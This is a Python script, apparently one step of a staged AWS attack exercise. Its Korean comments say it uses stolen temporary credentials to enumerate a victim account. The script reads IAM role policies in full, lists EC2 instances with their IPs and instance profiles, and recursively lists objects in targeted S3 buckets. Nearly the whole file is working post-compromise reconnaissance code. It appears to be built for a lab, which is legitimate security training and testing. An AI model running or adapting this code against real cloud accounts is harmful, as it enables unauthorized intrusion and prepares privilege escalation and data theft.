"""
Step 2 — Discovery (정찰)
탈취한 임시 자격증명으로 boto3 세션을 만들고 IAM·EC2·S3 정보를 수집한다.

단독 실행:
    python step2_discovery.py \\
        --access-key ASIA... --secret-key wJalr... --token IQoJb...
"""

import argparse
import json
import logging
import sys

import boto3
from botocore.exceptions import ClientError

sys.path.insert(0, __file__.rsplit("\\", 1)[0] if "\\" in __file__ else ".")
import config

logging.basicConfig(level=logging.INFO, format="[%(levelname)s] %(message)s")
log = logging.getLogger(__name__)


def make_session(access_key: str, secret_key: str, token: str) -> boto3.Session:
    return boto3.Session(
        aws_access_key_id=access_key,
        aws_secret_access_key=secret_key,
        aws_session_token=token,
        region_name=config.REGION,
    )


# ── IAM 정찰 ──────────────────────────────────────────────────────

def _discover_iam(session: boto3.Session, role_name: str) -> dict:
    iam = session.client("iam")
    result = {"role_name": role_name, "managed_policies": [], "inline_policies": {}}

    # 관리형 정책 목록
    try:
        resp = iam.list_attached_role_policies(RoleName=role_name)
        for p in resp.get("AttachedPolicies", []):
            arn = p["PolicyArn"]
            name = p["PolicyName"]
            version_resp = iam.get_policy(PolicyArn=arn)
            ver_id = version_resp["Policy"]["DefaultVersionId"]
            doc_resp = iam.get_policy_version(PolicyArn=arn, VersionId=ver_id)
            result["managed_policies"].append({
                "name": name,
                "arn": arn,
                "document": doc_resp["PolicyVersion"]["Document"],
            })
            log.info("  [IAM] 관리형 정책: %s (%s)", name, arn)
    except ClientError as e:
        log.warning("  managed_policies 조회 실패: %s", e)

    # 인라인 정책 목록 + 내용
    try:
        resp = iam.list_role_policies(RoleName=role_name)
        for policy_name in resp.get("PolicyNames", []):
            doc_resp = iam.get_role_policy(RoleName=role_name, PolicyName=policy_name)
            result["inline_policies"][policy_name] = doc_resp["PolicyDocument"]
            log.info("  [IAM] 인라인 정책: %s", policy_name)
    except ClientError as e:
        log.warning("  inline_policies 조회 실패: %s", e)

    return result


# ── EC2 정찰 ──────────────────────────────────────────────────────

def _discover_ec2(session: boto3.Session) -> dict:
    ec2 = session.client("ec2")
    result = {"instances": [], "instance_profiles": []}

    try:
        resp = ec2.describe_instances()
        for reservation in resp.get("Reservations", []):
            for inst in reservation.get("Instances", []):
                info = {
                    "instance_id": inst.get("InstanceId"),
                    "state": inst.get("State", {}).get("Name"),
                    "instance_type": inst.get("InstanceType"),
                    "private_ip": inst.get("PrivateIpAddress"),
                    "public_ip": inst.get("PublicIpAddress"),
                    "iam_profile": inst.get("IamInstanceProfile", {}).get("Arn"),
                    "tags": {t["Key"]: t["Value"] for t in inst.get("Tags", [])},
                }
                result["instances"].append(info)
                log.info("  [EC2] %s  %s  %s",
                         info["instance_id"], info["state"], info["private_ip"])
    except ClientError as e:
        log.warning("  EC2 describe_instances 실패: %s", e)

    try:
        resp = ec2.describe_iam_instance_profile_associations()
        for assoc in resp.get("IamInstanceProfileAssociations", []):
            result["instance_profiles"].append({
                "association_id": assoc.get("AssociationId"),
                "instance_id": assoc.get("InstanceId"),
                "profile_arn": assoc.get("IamInstanceProfile", {}).get("Arn"),
                "state": assoc.get("State"),
            })
    except ClientError as e:
        log.warning("  IAM instance profile associations 실패: %s", e)

    return result


# ── S3 정찰 ───────────────────────────────────────────────────────

def _list_objects_recursive(s3, bucket: str) -> list[dict]:
    objects = []
    paginator = s3.get_paginator("list_objects_v2")
    try:
        for page in paginator.paginate(Bucket=bucket):
            for obj in page.get("Contents", []):
                objects.append({
                    "key": obj["Key"],
                    "size": obj["Size"],
                    "last_modified": obj["LastModified"].isoformat(),
                })
    except ClientError as e:
        log.warning("    객체 목록 조회 실패 (%s): %s", bucket, e)
    return objects


def _discover_s3(session: boto3.Session) -> dict:
    s3 = session.client("s3", region_name=config.REGION)
    result = {"buckets": []}

    try:
        resp = s3.list_buckets()
        for b in resp.get("Buckets", []):
            name = b["Name"]
            log.info("  [S3] 버킷 발견: %s", name)
            entry = {"name": name, "objects": []}

            # target 버킷만 재귀 목록 조회 (접두사 일치)
            if name.startswith("cloud9-attack-target"):
                log.info("    → target 버킷 객체 목록 조회 중...")
                entry["objects"] = _list_objects_recursive(s3, name)
                for o in entry["objects"]:
                    log.info("      %s (%d bytes)", o["key"], o["size"])

            result["buckets"].append(entry)
    except ClientError as e:
        log.warning("  S3 list_buckets 실패: %s", e)

    return result


# ── 전체 실행 ─────────────────────────────────────────────────────

def run(access_key: str, secret_key: str, token: str, role_name: str = "cloud9-infra-attack-ec2-role") -> dict:
    log.info("=" * 60)
    log.info("Step 2: Discovery (정찰)")
    log.info("=" * 60)

    session = make_session(access_key, secret_key, token)

    iam_info = _discover_iam(session, role_name)
    ec2_info = _discover_ec2(session)
    s3_info  = _discover_s3(session)

    result = {
        "iam": iam_info,
        "ec2": ec2_info,
        "s3": s3_info,
    }
    log.info("[Step 2 완료] 정찰 수집 완료")
    return result


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Step 2: 임시 자격증명으로 IAM·EC2·S3 정찰")
    parser.add_argument("--access-key",  required=True)
    parser.add_argument("--secret-key",  required=True)
    parser.add_argument("--token",       required=True)
    parser.add_argument("--role-name",   default="cloud9-infra-attack-ec2-role",
                        help="EC2에 연결된 IAM Role 이름 (step1에서 확인)")
    args = parser.parse_args()

    result = run(args.access_key, args.secret_key, args.token, args.role_name)
    print("\n[결과]")
    print(json.dumps(result, indent=2, ensure_ascii=False, default=str))
